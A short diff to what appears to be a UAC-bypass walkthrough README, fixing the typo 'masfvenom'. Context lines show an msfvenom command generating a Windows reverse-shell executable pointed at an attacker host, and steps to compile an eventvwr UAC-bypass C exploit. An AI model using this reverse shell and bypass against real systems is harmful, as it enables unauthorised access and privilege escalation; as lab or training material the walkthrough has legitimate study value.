@@ -46,7 +46,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 -f exe > s
 we gonna use [eventvwr-bypassuac.c](https://github.com/k4sth4/UAC-bypass/blob/main/eventvwr-bypassuac.c)
 
 
-NOTE: Remember the name of the reverse shell that we generated with masfvenom is shell.exe. If you have given another name to payload, must change the name in C script and both our shell.exe and eventvwr-bypassuac.c needs to be on same directory on attacker vm.
+NOTE: Remember the name of the reverse shell that we generated with msfvenom is shell.exe. If you have given another name to payload, must change the name in C script and both our shell.exe and eventvwr-bypassuac.c needs to be on same directory on attacker vm.
 
 We need to compile the C script to get our exploit.
 ```markdown
